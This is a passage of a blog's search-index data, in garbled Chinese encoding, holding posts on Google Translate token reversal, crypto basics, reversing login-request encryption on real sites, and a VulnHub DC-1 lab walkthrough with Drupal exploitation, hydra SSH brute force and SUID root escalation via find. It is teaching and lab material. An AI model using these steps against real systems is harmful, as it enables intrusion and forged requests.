\"https://translate.google.cn/translate_a/single?client=webapp&amp;sl=en&amp;tl=zh-CN&amp;hl=zh-CN&amp;dt=at&amp;dt=bd&amp;dt=ex&amp;dt=ld&amp;dt=md&amp;dt=qca&amp;dt=rw&amp;dt=rm&amp;dt=sos&amp;dt=ss&amp;dt=t&amp;otf=2&amp;ssel=0&amp;tsel=0&amp;kc=3&amp;tk=\" + get_tk( q) + \"&amp;q=\" + q res = requests.get(url, headers=headers) data = res.content.decode() json_data = json.loads(data) print(json_data[0][0][0])if __name__ == \"__main__\": translate_google() tk.js 1234567891011121314151617181920212223242526272829303132//tkk = '441865.2154418832';var nu = function (a, b) &#123; for (var c = 0; c &lt; b.length - 2; c += 3) &#123; var d = b.charAt(c + 2); d = \"a\" &lt;= d ? d.charCodeAt(0) - 87 : Number(d); d = \"+\" == b.charAt(c + 1) ? a &gt;&gt;&gt; d : a &lt;&lt; d; a = \"+\" == b.charAt(c) ? a + d &amp; 4294967295 : a ^ d &#125; return a&#125;,pu = function (a) &#123; tkk='441865.2154418832'; var d = tkk.split(\".\"); var b = Number(d[0]); for (var e = [], f = 0, g = 0; g &lt; a.length; g++) &#123; var h = a.charCodeAt(g); 128 &gt; h ? e[f++] = h : (2048 &gt; h ? e[f++] = h &gt;&gt; 6 | 192 : (55296 == (h &amp; 64512) &amp;&amp; g + 1 &lt; a.length &amp;&amp; 56320 == (a.charCodeAt(g + 1) &amp; 64512) ? (h = 65536 + ((h &amp; 1023) &lt;&lt; 10) + (a.charCodeAt(++g) &amp; 1023), e[f++] = h &gt;&gt; 18 | 240, e[f++] = h &gt;&gt; 12 &amp; 63 | 128) : e[f++] = h &gt;&gt; 12 | 224, e[f++] = h &gt;&gt; 6 &amp; 63 | 128), e[f++] = h &amp; 63 | 128) &#125; a = b; for (f = 0; f &lt; e.length; f++) a += e[f], a = nu(a, \"+-a^+6\"); a = nu(a, \"+-3^+b+-f\"); a ^= Number(d[1]) || 0; 0 &gt; a &amp;&amp; (a = (a &amp; 2147483647) + 2147483648); a %= 1E6; return (a.toString() + \".\" + (a ^ b))&#125;; è¿è¡Œæ•ˆæœ äºŒã€æ€»ç»“å¸¸è§ç®—æ³•çš„åŠ å¯†åŸç† æ•£åˆ—(hash)å‡½æ•°ç®—æ³•ï¼šMD5ã€SHA å¯¹ç§°åŠ å¯†ç®—æ³•ï¼šDESã€3DESã€AES éå¯¹ç§°æ€§åŠ å¯†ç®—æ³•ï¼šRSAã€DSAã€ECC æ•£åˆ—(hash)å‡½æ•°ç®—æ³• ç®€ä»‹ Hashä¹Ÿç§°æ•£åˆ—ã€å“ˆå¸Œï¼Œå¯¹åº”çš„è‹±æ–‡éƒ½æ˜¯Hashã€‚åŸºæœ¬åŸç†å°±æ˜¯æŠŠä»»æ„é•¿åº¦çš„è¾“å…¥ï¼Œé€šè¿‡Hashç®—æ³•å˜æˆå›ºå®šé•¿åº¦çš„è¾“å‡ºã€‚è¿™ä¸ªæ˜ å°„çš„è§„åˆ™å°±æ˜¯å¯¹åº”çš„Hashç®—æ³•ï¼Œè€ŒåŸå§‹æ•°æ®æ˜ å°„åçš„äºŒè¿›åˆ¶ä¸²å°±æ˜¯å“ˆå¸Œå€¼ã€‚æ´»åŠ¨å¼€å‘ä¸­ç»å¸¸ä½¿ç”¨çš„MD5å’ŒSHAéƒ½æ˜¯å†å²æ‚ ä¹…çš„Hashç®—æ³•ã€‚ 1echo md5(&quot;è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•æ–‡æ¡ˆ&quot;);&#x2F;&#x2F; è¾“å‡ºç»“æœï¼š2124968af757ed51e71e6abeac04f98d ç‰¹ç‚¹ ä¸€ã€ä¸å¯é€†ï¼Œä¸åŸè§†æ•°æ®æ²¡æœ‰å¯¹åº”å…³ç³» äºŒã€è¾“å…¥æ•°æ®çš„å¾®å°å˜åŒ–ä¼šå¾—åˆ°å®Œå…¨ä¸åŒçš„hashå€¼ï¼Œç›¸åŒçš„æ•°æ®ä¼šå¾—åˆ°ç›¸åŒçš„å€¼ ä¸‰ã€hashç®—æ³•å†²çªæ¦‚ç‡æ¯”è¾ƒå°ï¼Œä½†æ˜¯æ ¹æ®æŠ½å±‰åŸç†ï¼Œä¸€å®šä¼šå­˜åœ¨ä¸åŒçš„è¾“å…¥è¢«æ˜ å°„æˆç›¸åŒè¾“å‡ºçš„æƒ…å†µ å¯¹ç§°åŠ å¯†ç®—æ³• ç®€ä»‹ ç§˜é’¥ï¼šåŠ å¯†è§£å¯†ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥ã€æ•°æ®çš„æœºå¯†æ€§åŒå‘ä¿è¯ã€åŠ å¯†æ•ˆç‡é«˜ã€é€‚åˆåŠ å¯†äºå¤§æ•°æ®å¤§æ–‡ä»¶ã€åŠ å¯†å¼ºåº¦ä¸é«˜(ç›¸å¯¹äºéå¯¹ç§°åŠ å¯†) éå¯¹ç§°æ€§åŠ å¯†ç®—æ³• ç®€ä»‹ ç§˜é’¥ï¼šåŠ å¯†è§£å¯†ä½¿ç”¨çš„ä¸åŒç§˜é’¥ã€æœ‰ä¸¤ä¸ªå¯†é’¥ã€éœ€è¦ä½¿ç”¨å¯†é’¥ç”Ÿæˆç®—æ³•ç”Ÿæˆä¸¤ä¸ªç§˜é’¥ã€æ•°æ®çš„æœºå¯†æ€§åªèƒ½å•å‘åŠ å¯†ã€å¦‚æœæƒ³è§£å†³è¿™ä¸ªé—®é¢˜ã€åŒå‘éƒ½éœ€è¦å„è‡ªæœ‰ä¸€å¯¹ç§˜é’¥ã€åŠ å¯†æ•ˆç‡ä½ã€åŠ å¯†å¼ºåº¦é«˜","categories":[{"name":"JSé€†å‘","slug":"JSé€†å‘","permalink":"http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"}],"tags":[{"name":"JSé€†å‘ç³»åˆ—","slug":"JSé€†å‘ç³»åˆ—","permalink":"http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"}]},{"title":"JSé€†å‘ç³»åˆ—ä¸€","slug":"JSé€†å‘ä¸€","date":"2020-06-17T10:16:58.000Z","updated":"2020-06-17T10:30:14.032Z","comments":true,"path":"2020/06/17/JSé€†å‘ä¸€/","link":"","permalink":"http://yoursite.com/2020/06/17/JS%E9%80%86%E5%90%91%E4%B8%80/","excerpt":"","text":"è°·æ­Œå­¦æœ¯é•œåƒ ç›®æ ‡ç½‘å€ï¼šhttps://ac.scmor.com/ ç›®çš„æ˜¯çˆ¬å–å­¦æœ¯é•œåƒçš„çœŸå®åœ°å€ï¼Œåœ¨Elementsè§†å›¾ä¸‹ï¼Œè§‚å¯Ÿç°åœ¨è®¿é—®aæ ‡ç­¾ï¼Œå‘ç°å¯ç”¨äº†onclickäº‹ä»¶ï¼Œè°ƒç”¨äº†visit()å‡½æ•°ï¼Œå‡½æ•°å†…çš„å†…å®¹ï¼ŒçŒœæµ‹å°±æ˜¯åŠ å¯†åçš„çœŸå®URLåœ°å€ã€‚ å…¨å±€æœç´¢visit,åœ¨ https://ac.scmor.com/res/?f=run&amp;v=1590682984 ä¸­ï¼Œæ‰¾åˆ°äº†visitå‡½æ•° ç»è¿‡è§‚å¯Ÿï¼ŒçŒœæµ‹strdecodeæ˜¯è§£å¯†å‡½æ•°ï¼Œå°±åœ¨ä¸Šå‡ è¡Œçš„ä½ç½®ï¼Œæœ‰ä¸ªå¯ç–‘å‚æ•°autour[b]ï¼ŒçŒœæµ‹æ˜¯URLåœ°å€ï¼Œåœ¨Consoleä¸­æµ‹è¯•ä¸€ä¸‹ ç»æµ‹è¯•ï¼Œautouræ˜¯ä¸ªæ•°ç»„ï¼Œé‡Œé¢å­˜æ”¾äº†åŠ å¯†åçš„çœŸå®åœ°å€ï¼Œstrdecodeä¹Ÿçš„ç¡®æ˜¯è§£å¯†å‡½æ•°ï¼Œç°åœ¨å»æ‹‰å–strdecodeå‡½æ•°å…·ä½“å†…å®¹ å…¨å±€æœç´¢ï¼Œæ‰¾åˆ°äº†strdecodeï¼Œç»è¿‡åˆæ­¥è§‚å¯Ÿï¼Œæ˜¯Base64åŠ å¯†ï¼Œç„¶åç¼ºå•¥è¡¥å•¥ï¼Œå°†åŠ å¯†å‡½æ•°å®Œæ•´çš„æå–å‡ºæ¥ åˆ°æ­¤ï¼ŒåŠ å¯†å‡½æ•°ä¹Ÿæœ‰äº†ï¼Œç°åœ¨éœ€è¦æ”¶é›†å…¨éƒ¨çš„URLï¼Œäºæ˜¯ï¼Œä¹‹å‰çš„autouræ•°ç»„ï¼Œä¹Ÿæ‹‰ä¸‹æ¥ï¼Œç°åœ¨åªéœ€è¦éå†ä¸€ä¸‹å°±å¥½äº†ï¼Œåˆšå¥½æœ‰ä¸ªrunå‡½æ•°å°±æ˜¯Forå¾ªç¯éå†autouræ•°ç»„ï¼Œä¹Ÿæ‹¿ä¸‹æ¥ ç¨å¾®ä¿®æ”¹ä¸‹ç»†èŠ‚ï¼Œå°±å¤§åŠŸå‘Šæˆï¼Œæ•ˆæœå›¾å¦‚ä¸‹ï¼š DNS.COM ç›®æ ‡ç½‘å€ï¼šhttps://www.dns.com/login.html éšä¾¿è¾“å…¥å¸å·å¯†ç è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°æœ‰ä¸ªXHRè¯·æ±‚ï¼Œé‡Œé¢çš„passwordï¼Œemailä¸¤ä¸ªè¯·æ±‚å‚æ•°éƒ½åšäº†åŠ å¯†ï¼ŒçŒœæµ‹è¿™å°±æ˜¯åˆšæ‰è¾“å…¥çš„å¸å·å¯†ç  å…¨å±€æœç´¢ password,é€šè¿‡åœ¨åé¢åŠ ä¸Š : æˆ–è€… = å¯ä»¥ç¼©å°èŒƒå›´ï¼Œæ’é™¤å¤šä½™é¡¹ï¼Œæ‰¾åˆ°äº†password:çš„ä½ç½®ï¼Œç°åœ¨å…¶å®å·²ç»å¾ˆæ˜æ˜¾æ˜¯AESåŠ å¯†äº†ï¼Œä½†è¿˜æ˜¯æµ‹è¯•ä¸€ä¸‹å§ æ‰“æ–­ç‚¹ï¼Œé‡æ–°ç™»é™†ï¼Œæœç„¶è¿›å…¥debuggerçŠ¶æ€äº†ã€‚ ç„¶ååœ¨consoleä¸­æµ‹è¯•ä¸‹aes()å‡½æ•°ä»¥åŠå®ƒçš„å‚æ•°åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œç»éªŒè¯ï¼Œå‘ç°aes()æ­£æ˜¯ä¸€ä¸ªåŠ å¯†å‡½æ•°ï¼ŒåŠ å¯†åçš„å†…å®¹å’Œä¸€å¼€å§‹çœ‹åˆ°çš„ç›¸å»åˆ ç°åœ¨æŸ¥çœ‹aeså‡½æ•°å…·ä½“çš„å†…å®¹ï¼Œå‘ç°äº†åˆæœ‰kå’Œivï¼Œå¹¶ä¸”æœ‰ä¸ªCryptoJSå¯¹è±¡ å…¨å±€æœç´¢CryptoJSï¼Œå‘ç°äº†crypto-js.jsæ–‡ä»¶ï¼Œæ˜æ˜¾è¿™æ˜¯CryptoJSåŠ å¯†åº“ å¹¶ä¸”å‘ç°è¿˜ç”¨äº†$(selector).action()çš„jQueryè¯­æ³•ï¼Œæ‰€ä»¥è¿˜éœ€è¦è½½å…¥jQueryåº“ ä»ç½‘ä¸Šä¸‹è½½å•ç‹¬çš„CryptoJSåº“æ–‡ä»¶å¼•å…¥ï¼Œä» ç½‘é¡µä¸­è·å–jQueryé“¾æ¥ï¼Œå¹¶è½½å…¥ jQueryï¼Œç„¶åå°†aeså‡½æ•°ä¹Ÿæ‹‰ä¸‹æ¥ æ•ˆæœå›¾å¦‚ä¸‹ï¼š è´è´ç½‘ ç›®æ ‡ç½‘å€ï¼šhttps://m.beibei.com/login/login.html ï¼ˆéœ€æ‰‹æœºç«¯ï¼‰ è¾“å…¥å¸å·å¯†ç åŠéªŒè¯ç è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°ä¸€ä¸ªXHRè¯·æ±‚ï¼Œç±»å‹ä¸ºPOSTï¼Œæäº¤çš„è¡¨å•æ•°æ®ä¸­çš„ç”¨æˆ·åå¯†ç éƒ½ä¸ºæ˜æ–‡ï¼Œä½†é—®é¢˜åœ¨äºè¯·æ±‚å‚æ•°ä¸­çš„_abr_ä¸€ç›´åœ¨å˜åŒ–ï¼ŒçŒœæµ‹å®ƒä¸ºåŠ å¯†å‚æ•° å…¨å±€æœç´¢_abr_æ— æœï¼Œåªèƒ½æ‰“è¯·æ±‚æ–­ç‚¹ï¼ŒæˆåŠŸæ–­ä½ ä½†æ˜¯å‘ç°æ–­ç‚¹çš„ä½ç½®æ²¡æœ‰æˆ‘ä»¬è¦çš„å†…å®¹ï¼Œäºæ˜¯åœ¨call Stackä¸­å¾€ä¸‹æ‰¾è°ƒç”¨æ ˆï¼Œcall Stackå†…çš„æ–¹æ³•è°ƒç”¨æ ˆçš„è§„åˆ™æ˜¯ä»ä¸Šåˆ°ä¸‹ç”±æœ€æ–°è°ƒç”¨å¤„ä¾æ¬¡å¾€ä¸‹æ’åˆ—ã€‚åœ¨e.ajaxä¸­å‘ç°äº†åŒ…å«æœ‰_abr_çš„å†…å®¹ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯è¦å‘é€å‡ºå»äº†ï¼Œæ²¡æœ‰å®ƒçš„äº§ç”Ÿè¿‡ç¨‹ï¼Œäºæ˜¯ç»§ç»­å¾€ä¸‹æ‰¾ï¼Œç»ˆäºæ‰¾åˆ°äº†_abr_= è®°å½•_abr_çš„å€¼ä¸ºï¼šâ€œ013e01885f35c08258b6ce21d500874ed5bb3143a05ed4b7b1â€ å‘ç°_abr_å…¶å®æ˜¯ç”±m(e.type, e.uri.pathname, e.query, e.form)å‡½æ•°ç”Ÿæˆï¼Œäºæ˜¯ä¸ºäº†äº†è§£å®ƒçš„ç”Ÿæˆè¿‡ç¨‹ï¼Œåœ¨å‡½æ•°å‰æ‰“ä¸Šæ–­ç‚¹ï¼Œé‡æ–°å‘é€ç™»é™†è¯·æ±‚ å•æ­¥è·Ÿè¸ªï¼Œå‘ç°äº†å…³é”®å‡½æ•°MD5 ç»§ç»­å•æ­¥è·Ÿè¸ªï¼Œåˆå‘ç°äº†ä¸€ä¸ªå…³é”®å‡½æ•°HMAC ç½‘ä¸ŠæŸ¥æ‰¾èµ„æ–™äº†è§£è¿™ä¸ªåŠ å¯†ç®—æ³•ï¼Œå‘ç°HMACç®—æ³•ï¼Œéœ€è¦ä¸€ä¸ªä¿¡æ¯æ‘˜è¦ç®—æ³•ä»¥åŠä¸€ä¸ªå¯†é’¥ï¼Œåœ¨ä¸‹æ–¹åˆæ‰¾åˆ°å…³é”®å‡½æ•°HmacSHA1ï¼Œäºæ˜¯æ¨æµ‹ä½¿ç”¨äº†SHA-1ç®—æ³• ç»è¿‡é•¿æ—¶é—´çš„å•æ­¥è·Ÿè¸ªï¼Œæ€»ç®—æ¥åˆ°äº†ä¸€å¼€å§‹çš„å‡½æ•°è¿”å›å€¼éƒ¨åˆ† ç°åœ¨ï¼Œæˆ‘ä»¬å¼€å§‹åˆ†æï¼ŒHMACç®—æ³•å¯ä»¥ä½¿ç”¨Pythonç¬¬ä¸‰æ–¹åº“å®ç°ï¼Œå…ˆå°è¯•ä¸€ä¸‹ã€‚åŠ å¯†å†…å®¹æœ‰äº†ï¼Œå¯†é’¥ä¹Ÿæœ‰äº†ï¼ˆåŠ å¯†ç›®æ ‡å€¼å¯ä»¥ç”¨JSON.stringify()æå–ï¼‰ åŠ å¯†ç›®æ ‡å€¼ï¼šâ€œ01\\nPOST\\nb7da15fd7cdc2b8c73958ee82e7424aa\\n/mroute.html?method=beibei.user.token.get\\n1591002077â€ å¯†é’¥ï¼šâ€œytU7vwqIx2UXQNsiâ€ Pythonæµ‹è¯•æ•ˆæœå¦‚ä¸‹ ä½†æ˜¯å‘ç°ï¼Œä¸_abrçš„å€¼ç›¸è¾ƒï¼Œå°‘äº†ä¸€äº›å†…å®¹ï¼Œå›è¿‡å¤´è§‚å¯Ÿï¼Œå‘ç°_abrçš„å€¼ç”±a+m+hç»„æˆï¼Œaç»æµ‹è¯•æ˜¯å›ºå®šå€¼01ï¼Œmå°±æ˜¯ç»è¿‡HMACåŠ å¯†åçš„å€¼ï¼Œhä¼šå˜åŠ¨ä¸”æš‚æ—¶è¿˜ä¸æ¸…æ¥š å¯¹hè¿›è¡Œåˆ†æï¼Œå‘ç°æ˜¯ç”±sçš„å€¼ä½¿ç”¨toString(16)å‡½æ•°å˜åŒ–è€Œæ¥ï¼Œè€Œsåˆ™æ˜¯æ—¶é—´æˆ³(new Date)å˜åŒ–è€Œæ¥ æå–å‡ºhçš„ç®—æ³•ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼ŒæˆåŠŸ æ¥ä¸‹æ¥ï¼Œåªå‰©ä¸‹éœ€è¦åŠ å¯†çš„å€¼ï¼Œå®ƒå¦‚ä½•äº§ç”Ÿçš„ï¼Œè§‚å¯Ÿå‘ç°ç”±a + &quot;\\n&quot; + e + &quot;\\n&quot; + f + &quot;\\n&quot; + p + &quot;\\n&quot; + sç»„æˆï¼Œaã€séƒ½æ¸…æ¥šäº†ï¼Œeå‘ç°æ˜¯POSTï¼Œpæ˜¯è·¯å¾„/mroute.html?method=beibei.h5.loginï¼Œè¿™ä¸¤ä¸ªä¹Ÿæ˜¯å›ºå®šå€¼ï¼Œåªå‰©ä¸‹fæ˜¯MD5åŠ å¯†åçš„å€¼ï¼Œé€†å‘fçš„äº§ç”Ÿè¿‡ç¨‹ï¼Œå‘ç°æ˜¯ç”±&quot;ç”¨æˆ·å+è·¯å¾„+ç™»é™†id&quot;äº§ç”Ÿè€Œæ¥ï¼Œå¦‚ï¼šusername=12341234123&amp;scene=h5_login&amp;rams_device_id=2654748010 æ‰€ä»¥ç°åœ¨åªéœ€è¦å°†è¿™ä¸ªå€¼MD5åŠ å¯†åä¼ å…¥å³å¯ï¼ŒåŒæ ·ä¹Ÿèƒ½ç”¨Pythonå®ç° æœ€ç»ˆå®Œæˆçš„æ•ˆæœ","categories":[{"name":"JSé€†å‘","slug":"JSé€†å‘","permalink":"http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"}],"tags":[{"name":"JSé€†å‘ç³»åˆ—","slug":"JSé€†å‘ç³»åˆ—","permalink":"http://yoursite.com/tags/JS%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/"}]},{"title":"VulnHubæ¸—é€ä¹‹DC-1","slug":"VulnHubæ¸—é€ä¹‹DC-1","date":"2020-05-25T04:57:51.000Z","updated":"2020-05-25T04:58:49.509Z","comments":true,"path":"2020/05/25/VulnHubæ¸—é€ä¹‹DC-1/","link":"","permalink":"http://yoursite.com/2020/05/25/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-1/","excerpt":"","text":"0Ã—00 è¯´æ˜ kaliä¸ç›®æ ‡å¤„äºåŒä¸€ç½‘æ®µä¸‹ æ”»å‡»æœºï¼šKali(VMware ) IP:192.168.1.31 ç‰¹åˆ«è¯´æ˜ï¼šæ¯ä¸ªé¶æœºä½œè€…éƒ½å¯¹é¶æœºåšäº†è¯¦ç»†çš„æè¿°ä»¥åŠæ”»å‡»ç›®æ ‡ï¼Œæ¯”å¦‚DC1å°±éœ€è¦æ‰¾åˆ°5ä¸ªflagï¼Œæœ€ç»ˆç›®æ ‡æ˜¯åœ¨rootçš„ä¸»ç›®å½•ä¸­æ‰¾åˆ°å¹¶è¯»å–è¯¥æ ‡å¿—ï¼ é€šè¿‡æ¯ä¸ªflagæ‰€è·å¾—çŸ¥è¯†ç‚¹ 1ã€msfçš„ç†Ÿç»ƒä½¿ç”¨ä»¥åŠæœç´¢å¯åˆ©ç”¨æ¼æ´ï¼ˆDrupalï¼‰ï¼› 2ã€ç•™æ„ç›®æ ‡ç½‘ç«™çš„é…ç½®æ–‡ä»¶ï¼ˆæ…¢æ…¢æŸ¥çœ‹åˆ«é”™è¿‡é‡è¦ä¿¡æ¯ï¼‰ï¼› 3ã€æ•°æ®åº“ç®¡ç†å‘˜ææƒï¼ˆæ›´æ–°ç®¡ç†å‘˜å¯†ç æˆ–è€…æ·»åŠ ä¸€ä¸ªæ–°ç”¨æˆ·ï¼‰ï¼› 4ã€suidææƒçš„å‘½ä»¤ï¼ˆnmapã€vimã€findã€bashã€moreã€lessã€nanoã€cpï¼‰ã€‚ 0Ã—01 ä¿¡æ¯æ”¶é›† æ¢æµ‹ç›®æ ‡IP namp -sP 192.168.1.0/24 arp-scan -l //æ‰«æå½“å‰ç½‘æ®µä¸‹çš„IP Cadmus Computer Systems è¡¨ç¤ºVirtualboxè™šæ‹Ÿæœº åˆ†æå¾—å‡ºç›®æ ‡IPä¸º192.168.1.30 é¶æœºï¼šDC-1(Virtualbox) IP:192.168.1.30 æ‰«æç«¯å£ nmap -sV -p- 192.168.1.30 //æ‰«æå…¨ç«¯å£ -sV ç”¨æ¥æ‰«æç›®æ ‡ä¸»æœºå’Œç«¯å£ä¸Šè¿è¡Œçš„è½¯ä»¶çš„ç‰ˆæœ¬ -p- æ‰«æ0-65535å…¨éƒ¨ç«¯å£ 80ç«¯å£å¼€æ”¾ï¼Œè®¿é—®ä¸€ä¸‹ Wappalyzerè¿›è¡Œç½‘ç«™æŒ‡çº¹è¯†åˆ«ï¼ŒæŸ¥çœ‹åˆ°æ˜¯Drupal 7 æŸ¥çœ‹ä¸€ä¸‹robots.txtæ–‡ä»¶å·²ç»ç›®å½•æ‰«æ(çœç•¥)ã€‚ã€‚å‘ç°æ²¡æœ‰å¯åˆ©ç”¨çš„åœ°æ–¹ 0Ã—02metasploit ç›´æ¥ä¸Šmetasploit 12root@sf:~# msfconsolemsf &gt; search Drupal é€‰æ‹©4ï¼Œdrupalgeddon2çš„expï¼Œè®¾ç½®ä¸‹rhostï¼Œç›´æ¥exploitï¼ŒæˆåŠŸ æ¥ä¸‹æ¥ä½¿ç”¨msfè‡ªå¸¦çš„shell å‘ç°flag1 æŸ¥çœ‹å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼Œå‘ç°flag1.txtæ–‡ä»¶ï¼ŒæŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°æç¤ºCMSé…ç½®æ–‡ä»¶æœ‰çŒ«è…» å‘ç°flag2 ç½‘ä¸Šæœç´¢å¾—çŸ¥ï¼ŒDrupal 7çš„é»˜è®¤é…ç½®æ–‡ä»¶ä¸ºsites/default/settings.phpï¼ŒæŸ¥çœ‹å‘ç°flag2ï¼Œè¿˜æœ‰æ•°æ®åº“è¿æ¥ä¿¡æ¯ 0Ã—003 å¼¯è·¯ å°è¯•è¿æ¥æ•°æ®åº“ï¼Œç»“æœè¿æ¥å¤±è´¥ï¼Œåº”è¯¥æ˜¯æƒé™ä¸è¶³ çˆ†ç ´flag4ç”¨æˆ·å¯†ç  äºæ˜¯å»æŸ¥çœ‹/etc/passwdæ–‡ä»¶ï¼Œå‘ç°flag4ç”¨æˆ· ä½¿ç”¨hydraå°è¯•çˆ†ç ´flag4ç”¨æˆ·çš„å¯†ç ï¼Œhydra -l flag4 -P /usr/share/john/password.lst ssh://192.168.1.30 æˆåŠŸçˆ†ç ´flag4çš„å¯†ç ï¼Œä¸º orange ï¼Œæ¥ä¸‹æ¥sshç™»å½•flag4ç”¨æˆ·ï¼ŒæŸ¥çœ‹å½“å‰è·¯å¾„ä¸‹æœ‰flag4.txtï¼Œå¾—åˆ°æ–°çš„æç¤ºâ€”â€”rootç›®å½•é‡Œæœ‰ä¸ªflag 0Ã—04 è¿æ¥æ•°æ®åº“ ç„¶åæˆ‘ä»¬è¿æ¥æ•°æ®åº“ï¼Œè¿™æ¬¡æˆåŠŸ é¡ºè—¤æ‘¸ç“œï¼Œä»”ç»†æŸ¥æ‰¾æ•°æ®åº“ æŸ¥çœ‹userè¡¨ï¼Œå‘ç°adminç”¨æˆ· æŸ¥çœ‹roleè¡¨ æŸ¥çœ‹role_permissionè¡¨ æŸ¥çœ‹nodeè¡¨ å‘ç°flag3 å‘ç°flag3ï¼Œå¾—çŸ¥uidä¸º1çš„ç”¨æˆ·æ˜¯ä¸å—Drupalæƒé™ç®¡åˆ¶çš„ï¼Œå…·æœ‰æœ€é«˜æƒé™ï¼Œuid 1ç”¨æˆ·ä¹Ÿå°±æ˜¯adminï¼Œ 0Ã—05 ä¸¤ä¸ªæ€è·¯ ä¸€ã€é‡ç½®ç®¡ç†å‘˜å¯†ç  ä½¿ç”¨Drupalå¯¹æ•°æ®åº“çš„åŠ å¯†æ–¹æ³•ï¼ŒåŠ å¯†è„šæœ¬ä½ç½®åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„scriptä¸‹(msf shell)ï¼Œä½¿ç”¨è„šæœ¬ç”ŸæˆåŠ å¯†å¯†æ–‡ï¼Œç„¶åç™»é™†æ•°æ®åº“ä¿®æ”¹adminçš„å¯†ç  ä¿®æ”¹å¯†ç ä¸º123456 æˆåŠŸç™»é™† äºŒã€æ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜æƒé™çš„ç”¨æˆ· å…ˆæŸ¥çœ‹ä¸€ä¸‹é¶æœºçš„ç‰ˆæœ¬ï¼Œ7.24 msfæœç´¢Druapl 7.24å¯¹åº”å¯åˆ©ç”¨çš„è„šæœ¬ï¼Œå‘ç°ä¸€ä¸ªç¬¦åˆ è¿è¡Œè„šæœ¬ï¼Œè¿›è¡Œåˆ©ç”¨ å¢åŠ äº†ä¸€ä¸ªç”¨æˆ·userï¼Œå¯†ç ä¸º123456ï¼Œå°è¯•ç™»é™†ç½‘ç«™ï¼Œå‘ç°ç™»é™†æˆåŠŸ å‘ç°flag3 ä»ç½‘ç«™ä¸Šæ‰¾åˆ°äº†flag3çš„ç•Œé¢ï¼Œå¾—åˆ°æç¤ºSpecial PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.ï¼Œé‡ç‚¹åœ¨ï¼ˆFIND the passwdã€need to -exec that commandã€in the shadowï¼‰ æ ¹æ®çº¿ç´¢ï¼Œæˆ‘ä»¬åˆæ‰¾åˆ°äº†flag4ä»¥åŠå®ƒçš„ç›®å½•ï¼Œå†æ ¹æ®flag4çš„æç¤ºï¼Œï¼ˆç”¨ç›¸åŒçš„æ–¹æ³•åœ¨rootç›®å½•ä¸‹ï¼‰æ‰¾åˆ°æœ€ç»ˆflag 0Ã—06 ææƒ äºæ˜¯ï¼Œæƒ³åˆ°suidææƒï¼ŒæŸ¥è¯¢å…·æœ‰rootæƒé™çš„å‘½ä»¤ï¼Œä»¥ä¸‹å‡å¯æŸ¥è¯¢ï¼š find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000 -exec ls -ldb { } æ³¨ï¼š -type få³æ–‡ä»¶ï¼Œ-perm -u=s å³useræƒé™ä½ä¸ºsuid å‘ç°findå‘½ä»¤æœ¬èº«å°±æ˜¯rootæƒé™ äºæ˜¯å°±ç”¨findææƒï¼Œfind ./ aaa -exec '/bin/sh' \\\\; ï¼Œæˆ–è€…æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼ŒéªŒè¯ä¸€ä¸‹ï¼Œå·²ç»æ˜¯rootäº† æœ€ç»ˆflag æ¥ç€æ‰¾åˆ°æ ¹ç›®å½•ä¸‹çš„rootç›®å½•ï¼Œé‡Œé¢å°±æ˜¯æœ€ç»ˆçš„flag 0Ã—07 æ€»ç»“ DC-1æ‰¾åˆ°æœ€ç»ˆçš„flagå¹¶ä¸éš¾ï¼Œéš¾åœ¨æ‰¾é½äº”ä¸ªflagï¼Œç¬¬ä¸€æ¬¡å®éªŒï¼Œå¾ˆç”Ÿç–ï¼Œå­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼š metasploit ç†Ÿç»ƒåº¦ä¸è¶³ï¼Œä¸”exploitæ¨¡å—æˆåŠŸåçš„shellä¸æ˜¯äº¤äº’æ€§ï¼ŒDC-1å®‰è£…äº†pythonç¯å¢ƒï¼Œå¯ä»¥é€šè¿‡pty.spawn()è·å¾—äº¤äº’æ€§shell exploitdbç†Ÿç»ƒåº¦ä¹Ÿä¸è¶³ Linuxç†Ÿç»ƒåº¦ä¸è¶³ï¼Œfindå‘½ä»¤ï¼Œæœ‰å¾…å­¦ä¹  suidææƒçš„å‘½ä»¤ï¼ˆnmapã€vimã€findã€bashã€moreã€lessã€nanoã€cpï¼‰ï¼Œæœ‰å¾…å­¦ä¹ ","categories":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://yoursite.com/tags/VulnHub/"}]}],"categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"},{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"},{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"},{"name":"JSé€†å‘","slug":"JSé€†å‘","permalink":"http://yoursite.com/categories/JS%E9%80%86%E5%90%91/"}],"tags":[{"name":"pythonåº“","slug":"pythonåº“","permalink":"http://yoursite.com/tags/python%E5%BA%93/"},{"name":"VulnHub","slug":"VulnHub","permalink":"http://yoursite.com/tags/VulnHub/"},{"name":"æŠ€å·§","slug":"æŠ€å·§","permalink":"http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"},{"name":"NMAP","slug":"NMAP","permalink":"http://yoursite.com/tags/NMAP/"},{"name":"Sqlmap","slug":"Sqlmap","permalink":"http://yoursite.com/tags/Sqlmap/"},{"name":"BurpSuite","slug":"BurpSuite